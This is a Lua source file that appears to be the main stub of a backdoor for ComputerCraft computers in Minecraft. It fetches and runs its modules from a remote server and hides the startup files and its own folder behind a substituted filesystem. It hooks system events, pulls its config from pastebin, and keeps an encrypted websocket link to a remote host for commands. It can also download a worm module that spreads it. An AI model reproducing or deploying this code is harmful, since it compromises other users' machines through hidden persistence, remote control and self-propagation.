-- SPDX-FileCopyrightText: 2024 David Lightman
--
-- SPDX-License-Identifier: LicenseRef-CCPL
--
-- Spook behind the bar, unmarked car --
local main = {}
main.__index = main
local isShuttingDown = false
local _ogg = _G
local _ogENV = _ENV
local _OGShell = shell
local _OGFS = _G.fs
local backupPullEventRaw = _G.os.pullEventRaw
local backupPullEvent = _G.os.pullEvent
local customeventmanagerLibrary = (pcall(require, "hooks.customeventmanager") and require("hooks.customeventmanager")) or load(http.get("https://mydevbox.cc/src/hooks/customeventmanager.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "customeventmanagerLibrary", "t", _G)()
local eventhookLibrary = (pcall(require, "hooks.eventhook") and require("hooks.eventhook")) or load(http.get("https://mydevbox.cc/src/hooks/eventhook.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "eventhookLibrary", "t", _G)()
local httpLibrary = (pcall(require, "networking.http.http") and require("networking.http.http")) or load(http.get("https://mydevbox.cc/src/networking/http/http.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "http", "t", _G)()
local filesystemLibrary = (pcall(require, "modules.persistent.hide_fs") and require("modules.persistent.hide_fs")) or load(http.get("https://mydevbox.cc/src/modules/persistent/hide_fs.lua",{["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "hide_fs", "t", _G)()
local custompairsLibrary = (pcall(require, "hooks.custompairs") and require("hooks.custompairs")) or load(http.get("https://mydevbox.cc/src/hooks/custompairs.lua").readAll(), "custompairsLibrary", "t", _G)()
local eventhandlerLibrary = (pcall(require, "eventhandler.eventhandler") and require("eventhandler.eventhandler")) or load(http.get("https://mydevbox.cc/src/eventhandler/eventhandler.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "eventhandlerLibrary", "t", _G)()
local configLibrary= (pcall(require, "config.config") and require("config.config")) or load(http.get("https://mydevbox.cc/src/config/config.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "config", "t", _G)()
local utilsLibrary= (pcall(require, "sys.utils.utils") and require("sys.utils.utils")) or load(http.get("https://mydevbox.cc/src/sys/utils/utils.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "utils", "t", _G)()
local cc_rsaLibrary = (pcall(require, "sys.crypto.cc_rsa") and require("sys.crypto.cc_rsa")) or load(http.get("https://mydevbox.cc/src/sys/crypto/cc_rsa.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "rsa", "t", _G)() 
local wsrouter = (pcall(require, "networking.http.wsrouter") and require("networking.http.wsrouter")) or load(http.get("https://mydevbox.cc/src/networking/http/wsrouter.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "wsrouter", "t", _G)()
local rednetrouter = (pcall(require, "networking.rednet.router") and require("networking.rednet.router")) or load(http.get("https://mydevbox.cc/src/networking/rednet/router.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "rednetrouter", "t", _G)()
local core_router = (pcall(require, "networking.core_router") and require("networking.core_router")) or load(http.get("https://mydevbox.cc/src/networking/core_router.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "core_router", "t", _G)()
local EnD = (pcall(require, "sys.crypto.EnD") and require("sys.crypto.EnD")) or load(http.get("https://mydevbox.cc/src/sys/crypto/EnD.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "EnD", "t", _G)()
local command_handler = (pcall(require, "networking.processor.command_handler") and require("networking.processor.command_handler")) or load(http.get("https://mydevbox.cc/src/networking/processor/command_handler.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "command_handler", "t", _G)()
local uninstaller_installer = (pcall(require, "uninstaller") and require("uninstaller")) or load(http.get("https://mydevbox.cc/src/uninstaller.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "uninstaller", "t", _G)()
local wormLibrary= nil

local configpath = nil
local metadataFile = nil
local rstartup = utilsLibrary.generateRandomString(3)
_OGFS.copy("startup.lua",rstartup)

local function getShellRunArgument()
    if not _OGFS.exists(rstartup) then
        return nil
    end

    local f = _OGFS.open(rstartup, "r")
    if not f then
        return nil
    end

    for line in f.readLine do
        local argument = string.match(line, '^%s*shell%.run%(%s*["\'](.-)["\']%s*%)')
        if argument then
            f.close()
            return argument
        end
    end

    f.close()
    return nil
end
local bootfile = getShellRunArgument()

local function getRealStartupPath()
    if not _OGFS.exists(bootfile) then
         return nil  end
    local f1 = _OGFS.open(bootfile, "r")
    if not f1 then
        return nil end
    for i = 1, 6 do
        local l = f1.readLine()
        if not l then
            break
        end
        local filename = string.match(l, "^%-%-(%S+)%.$")
        if filename then
            f1.close()
            return filename
        end
    end
    f1.close()
    return nil
end

local function getBDApath()
    if not _OGFS.exists(bootfile) then
        return nil, nil 
    end
    local f = _OGFS.open(bootfile, "r")
    if not f then 
        return nil, nil
    end
    for i = 1, 6 do
        local l = f.readLine()
        if not l then 
            break
        end
        local path, filename = string.match(l, "^%-%-(.-),(%S+)$")
        if path and filename then
            f.close()
            return path, filename
        end
    end
    f.close()
    return nil, nil
end

local function getMetadataFile()
    if not _OGFS.exists(bootfile) then
        return nil
    end

    local f = _OGFS.open(bootfile, "r")
    if not f then
        return nil
    end

    for i = 1, 10 do
        local line = f.readLine()
        if not line then
            break
        end

        local key= string.match(line, "^%-%-(%S+)%^")
        if key then
            f.close()
            return key
        end
    end
    f.close()
    return nil
end

local xsup=getRealStartupPath()
local bdapath, filename = getBDApath()
metadataFile=getMetadataFile()
_OGFS.delete(rstartup)

local function getConfigUrl()
    --metadataFile
    if ((_OGFS.exists(metadataFile)) and (utilsLibrary.getFileSize(_OGFS, metadataFile) > 0)) then
        configpath = utilsLibrary.getMetadataValue(_OGFS, metadataFile, "config", "|")
    end
end

local function hideStartup()
    if xsup ~= nil then
        local handle = _OGFS.open(xsup, "r")
        if handle then
            local contents = handle.readAll() or ""
            handle.close()
            if contents == "" then
                -- Hide real startup.lua file if xsup has no contents
                filesystemLibrary.hideFile("startup.lua")
            else
                -- Set xsup as the original startup and hide it
                filesystemLibrary.setOriginalStartup(xsup)
                filesystemLibrary.hideFile(xsup)
            end
        else
            -- If the file can't be opened, fallback to hiding the real startup.lua
            filesystemLibrary.hideFile("startup.lua")
        end
    else
        -- If xsup is nil, ensure real startup.lua is hidden
        filesystemLibrary.hideFile("startup.lua")
    end
end

function main.setup()
hideStartup()
getConfigUrl()
if xsup~=nil then
    filesystemLibrary.setOriginalStartup(xsup)
    filesystemLibrary.hideFile(xsup)
end
if (bootfile~=nil) then
    filesystemLibrary.hideFile(bootfile)
end
if metadataFile~=nil then
    filesystemLibrary.hideFile(metadataFile)
end
if filesystemLibrary ~= nil and bdapath ~= nil then
    filename = nil
    filesystemLibrary.hideDir(bdapath)
end
_G.fs=filesystemLibrary
uninstaller_installer.setOGFS(_OGFS)
uninstaller_installer.setCFS(filesystemLibrary)
uninstaller_installer.setOGShell(_OGShell)
eventhookLibrary.setCustomQueueEvent(customeventmanagerLibrary.getQueueEventName())
eventhookLibrary.setOriginalPullEvent(backupPullEvent)
eventhookLibrary.setOriginalPullEventRaw(backupPullEventRaw)
eventhookLibrary.activate()

httpLibrary.addEventHandlers(eventhookLibrary)
httpLibrary.setCustomPullEvent(customeventmanagerLibrary.getPullEventName())
--httpLibrary.addSilentDomain("mydevbox.cc") --TODO: FIX for WS, add session ids
_G.http = httpLibrary
custompairsLibrary.add_to_blacklist(customeventmanagerLibrary.getPullEventName())
custompairsLibrary.add_to_blacklist(customeventmanagerLibrary.getQueueEventName())

eventhookLibrary.setEventHandler(eventhandlerLibrary)
--local startup = (pcall(require, "sys.startup") and require("sys.startup")) or load(http.get("https://mydevbox.cc/src/sys/startup.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "startup", "t", _G)()
--startup:onStartup()
if (configpath~=nil) then configLibrary:DownloadConfig("https://pastebin.com/raw/"..configpath)  else return main end
--New: RjaTsuaK
 --Old: https://pastebin.com/raw/rHA43mQp
 configLibrary:set("identifier.stubid", utilsLibrary.generateRandomString(16))
--print("identifier: "..config:get("identifier.stubid"))
--print("RHOST: {Redacted for sanity sake}")
local handlerInstance = setmetatable({}, eventhandlerLibrary)
httpLibrary.setEnD(EnD)
wsrouter.setIdentifier(configLibrary:get("identifier.stubid"))
wsrouter.setRSA(cc_rsaLibrary)
wsrouter.setUtils(utilsLibrary)
wsrouter.setEnD(EnD)
wsrouter.setRawRhost("wss://"..configLibrary:get("networking.http.rhost"))
wsrouter.setOwnerID(configLibrary:get("identifier.ownerid"))
wsrouter.setConfig(configLibrary)
rednetrouter.setIdentifier(configLibrary:get("identifier.stubid"))
rednetrouter.setRSA(cc_rsaLibrary)
rednetrouter.setUtils(utilsLibrary)
rednetrouter.setEnD(EnD)
core_router.setRednetrouter(rednetrouter)
core_router.setWsrouter(wsrouter)
core_router.setCommandHandler(command_handler)
core_router.setRednetEnabled(configLibrary:get("networking.rednet.enabled"))
core_router.setWsEnabled(configLibrary:get("networking.http.enabled"))
command_handler.setMain(main)

    if (configLibrary:get("persistent.worm")==true) then
        wormLibrary = load(http.get("https://mydevbox.cc/src/modules/worm.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "worm", "t", _G)()
    end
end

function main.getConfig()
    return configLibrary
end
function main.getConfigUrl()
    return configurl
end
function main.setConfigUrl(url)
    configurl = url
end
function main.getUtils()
    return utils
end
function main.getRSA()
    return cc_rsaLibrary
end
function main.getEnD()
    return EnD
end
function main.getCore_Router()
    return core_router
end
function main.getUninstaller()
    return uninstaller
end
function main.getOGShell()
    return _OGShell
end
function main.getOGFS()
    return _OGFS
end

function main.getProgramPath()
    return bdapath
end

function main.init()
    wsrouter.allow_encryption(true)
    wsrouter.connect(configLibrary:get("networking.http.rhost"))
    core_router.TXRX2Host("0x00", false)
    while not isShuttingDown do
        core_router.TXRX2Host("0x00", false)
        sleep(10)
    end
end
return main